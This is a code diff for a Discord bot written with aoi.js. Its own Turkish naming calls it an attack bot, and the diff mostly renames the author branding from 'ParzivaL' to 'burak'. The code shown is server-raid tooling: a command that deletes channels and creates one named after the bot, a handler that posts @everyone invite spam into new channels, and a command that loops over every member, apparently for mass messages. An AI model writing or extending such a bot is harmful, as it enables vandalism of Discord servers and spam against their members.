@@ -1,6 +1,6 @@
-const parzi = require("aoi.js")
+const burak = require("aoi.js")
 var fs = require('fs')
-const bot = new parzi.Bot({
+const bot = new burak.Bot({
     token: process.env.token,//.env dosyasında token yazan variablenin değerine tokeninizi yazın
     prefix:"$getServerVar[prefix]"//ayarlamalı prefix 
 })
@@ -52,15 +52,15 @@ bot.awaitedCommand({
 bot.awaitedCommand({
   name:"kanalsil",
   code:`
-  $createChannel[ParzivaL saldırı botu altyapısı;text]
+  $createChannel[burak saldırı botu;text]
   $deleteChannels[$channelID]
   `
   })
 
 bot.channelCreateCommand({
-  channel:"ParzivaL",
+  channel:"burakvurdu",
   code:`
-  $channelSendMessage[$newChannel[id];@everyone https://discord.gg/400]
+  $channelSendMessage[$newChannel[id];@everyone https://discord.gg/codeshare]
   `
   })
 bot.onChannelCreate()
@@ -71,7 +71,7 @@ name:"dmduyur",
 
 code:`
 
-$forEachMember[parzi]
+$forEachMember[burak]
 
 `
 
@@ -79,7 +79,7 @@ $forEachMember[parzi]
 
 bot.awaitedCommand({
 
-name:"parzi",
+name:"burak",
 
 code:`
 
